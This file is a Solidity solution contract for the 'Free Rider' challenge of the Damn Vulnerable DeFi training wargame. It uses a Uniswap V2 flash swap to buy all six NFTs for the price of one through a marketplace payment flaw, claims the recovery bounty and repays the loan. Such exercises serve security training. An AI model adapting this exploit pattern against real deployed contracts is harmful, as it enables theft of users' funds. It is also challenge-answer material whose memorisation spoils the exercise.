// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderSolve is IERC721Receiver {

    address private immutable player;

    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;
    
    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory factory;
    IUniswapV2Router02 router;
    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recovery;

    error CallerNotNFT();

    constructor(FreeRiderRecoveryManager _recovery, 
                WETH _weth, 
                DamnValuableNFT _nft, 
                IUniswapV2Pair _pair, 
                FreeRiderNFTMarketplace _marketplace) {
        recovery = _recovery;
        player = msg.sender;
        weth = _weth;
        nft = _nft;
        pair = _pair;
        marketplace = _marketplace;
    }
    function attack() public payable {
        // Flashloan 90 eth using uniswap v2
        // https://solidity-by-example.org/defi/uniswap-v2-flash-swap/
        
        // weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
        bytes memory data = abi.encode(weth, address(this));

        pair.swap(NFT_PRICE, 0, address(this), data);
        
        // Payback the loan + fee, send 6 nfts to the recovery account
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        (address tokenBorrow, address caller) =
            abi.decode(data, (address, address));

        require(tokenBorrow == address(weth), "token borrow != weth");

        // Withdraw eth first
        weth.withdraw(NFT_PRICE);

        // Buy all 6 nfts, then marketplace will send player 90 ether
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
        }
        marketplace.buyMany{value: NFT_PRICE }(ids);

        // Send the nfts to the recovery manager
        // Encode player address to data
        bytes memory data2 = abi.encode(player);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            nft.safeTransferFrom(nft.ownerOf(ids[i]), address(recovery), ids[i], data2);

        }
        // The transfer call above triggers the onERC721Received() function in FreeRiderRecoveryManager.sol 
        // It sends 45 eths to address of player as reward

        // Repay the loan
        uint256 fee = (NFT_PRICE * 3) / 997 + 1;
        uint256 amountToRepay = NFT_PRICE + fee;

        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);

    }

    function onERC721Received(address, address, uint256, bytes memory)
        external
        view
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {
    }
}